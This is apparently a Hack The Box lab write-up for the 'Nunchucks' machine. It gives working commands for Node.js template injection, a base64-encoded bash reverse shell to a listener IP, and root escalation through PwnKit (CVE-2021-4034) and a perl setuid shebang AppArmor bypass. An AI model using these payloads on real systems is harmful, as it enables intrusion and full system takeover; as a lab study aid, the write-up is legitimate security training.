---
layout: single
title: Nunchucks  - Hack The Box
excerpt: "Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary AppArmor profile while executing scripts that include the shebang of the profiled application."
date: 2025-06-01
classes: wide
header:
  teaser: /img2/nunchucks.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - NodeJS SSTI (Server Side Template Injection)
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - AppArmor Profile Bypass (Privilege Escalation) (OPTION 2)
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.122
```

![](/img2/Pasted%20image%2020250601184103.png)

- Add domain to local DNS

```bash
echo "10.10.11.122 nunchucks.htb" >> /etc/hosts
```

- Wfuzz to find subdomains

```bash
wfuzz -c --hw=2271 -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb/
```

![](/img2/Pasted%20image%2020250601194255.png)

- Add subdomain to local DNS

```bash
echo "10.10.11.122 store.nunchucks.htb" >> /etc/hosts
```

## Exploitation

- SSTI Injection

![](/img2/Pasted%20image%2020250601194519.png)

https://ctftime.org/writeup/34053

```javascript
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}
```

![](/img2/Pasted%20image%2020250601212336.png)

- Send reverse shell

```bash
echo -n "/bin/bash -i >& /dev/tcp/10.10.16.7/9000 0>&1" | base64
```

![](/img2/Pasted%20image%2020250601212739.png)

![](/img2/Pasted%20image%2020250601212819.png)

```javascript
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjcvOTAwMCAwPiYx|base64 -d|bash')\")()}}
```

```bash
nc -nlvp 9000
```

## Post-exploitation (OPTION 1)

- Find sudoers

```bash
find / -perm -4000 2>/dev/null 
```

![](/img2/Pasted%20image%2020250601213525.png)

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Find Capabilities

```bash
getcap -r / 2>/dev/null
```

![](/img2/Pasted%20image%2020250601224157.png)

- Try to take advantage of capabilitie

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

> Maybe, we have a restriction, so we can take advantage of wrong shebang in bash script.

- Exploit shebang perl bug

```bash
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0); 
exec "/bin/sh"; 
```

```bash
chmod +x exploit.sh
./exploit.sh
```


![](/img2/Pasted%20image%2020250601213353.png)